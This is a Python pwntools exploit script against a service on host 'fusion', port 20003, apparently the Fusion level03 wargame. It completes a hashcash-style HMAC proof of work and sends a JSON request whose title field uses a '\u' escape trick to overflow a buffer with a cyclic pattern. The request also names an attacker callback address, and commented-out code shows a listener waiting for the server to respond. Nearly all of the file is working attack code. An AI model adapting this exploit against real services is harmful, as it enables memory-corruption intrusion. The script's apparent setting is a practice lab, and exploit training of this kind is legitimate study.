import random, string, hmac
import hashlib
import json
import struct
import time
import pwn
import sys


rhost = 'fusion'
rport = 20003
callback_port = 8000
lhost = '192.168.6.1'

def random_string(size=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

def generate_payload(tag: str) -> bytes:
    title_expected_length = 128
    malicious_title: bytes = b'A' * (title_expected_length - 1)
    malicious_title += b'\\\u' # \u symbol in input will push the counter forward by 2 and the while loop will not terminate at the expected location
    malicious_title += b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' # pwn cyclic 100

    payload: bytes = f'{{"tags": ["{tag}"], "contents": "test", "serverip": "{lhost}:{callback_port}", "title": "'.encode()
    payload += malicious_title
    payload += b'" }'

    return payload
    

def generate_hashcashed_payload(token: str) -> bytes:
    pwn.log.info('Generating hashcashed payload')
    while (True):
        request_body: bytes = generate_payload(random_string(20))
        
        payload = token.encode() + b'\n' + request_body
        hashed = hmac.new(token.encode(), payload, hashlib.sha1)
     
        if hashed.hexdigest()[:4] == "0000":
            pwn.log.info("Payload:")
            print(payload)
            pwn.log.info(f"Hash: {hashed.hexdigest()}")
            return payload


def receive_token(io) -> str:
    token: str = io.recvline().decode().split('"')[1]
    pwn.log.info(f"Token: {token}")
    return token
    

def main():
    # callback_listener = pwn.listen(callback_port)
    io = pwn.remote(rhost, rport)

    token = receive_token(io)
    payload: bytes = generate_hashcashed_payload(token)

    io.send(payload)
    pwn.log.info('Payload sent!')
    io.close()

    # callback_listener.wait_for_connection()
    # response = callback_listener.recv()
    # pwn.log.info('Received the following response from server:')
    # print(response)

if __name__ == "__main__":
    main()
